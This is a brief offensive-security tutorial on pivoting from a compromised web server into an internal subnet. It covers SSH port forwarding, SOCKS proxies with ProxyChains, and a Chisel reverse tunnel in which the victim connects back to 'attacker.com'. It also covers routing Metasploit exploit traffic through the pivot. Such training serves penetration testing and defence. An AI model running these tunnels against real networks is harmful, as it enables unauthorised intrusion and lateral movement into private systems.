# Pivoting, Tunneling, and Port Forwarding

## 1. Unit Brief: Bypassing the Firewall
You are on a compromised web server (`10.0.0.5`). The Database (`10.0.1.50`) is on a different subnet blocked from the internet. Pivoting helps you route your traffic *through* the web server to hit the database.

## 2. Real-World Relevance
*   **The DMZ**: Web servers live in the DMZ. Databases live in the Internal network.
*   **The Pivot**: The Web server can talk to the DB. You talk to the Web server.

## 3. Core Concepts

### Local Port Forwarding
"Make port 3306 on the remote target available on port 3306 on my laptop."
*   `ssh -L 3306:db-server:3306 user@pivot-host`

### Dynamic Port Forwarding (SOCKS Proxy)
"Turn the compromised host into a router."
*   `ssh -D 9090 user@pivot-host`
*   Configure ProxyChains to use SOCKS5 127.0.0.1:9090.
*   Run `proxychains nmap ...`

### Reverse Tunnels
If the firewall blocks *incoming* SSH, but allows *outgoing*:
*   The compromised host connects back to YOU.

## 4. Practical Examples

### Ligolo-ng / Chisel
Modern tools for pivoting.
*   **Chisel**: Simple Go binary.
    *   Server (You): `./chisel server -p 8000 --reverse`
    *   Client (Victim): `./chisel client attacker.com:8000 R:socks`
*   **Result**: You now have a SOCKS proxy into their internal network.

### Routing Exploit Traffic
1.  Set up Pivot.
2.  `proxychains msfconsole`
3.  Run exploits targeting `10.0.1.50`.
4.  Traffic goes: You -> Pivot -> Target.

## 5. Common Mistakes Beginners Make
*   **Slow Scanning**: Scanning through a proxy is SLOW. Nmap Scan through proxychains is agonizing. Scan only specific ports you need.
*   **Dropping Connection**: If your pivot shell dies, your tunnel dies. Need persistence.

## 6. Key Takeaways
*   **Deep Access**: Pivoting is how you go from "I hacked one server" to "I hacked the network".
*   **SSH is your friend**: Master SSH tunnels.
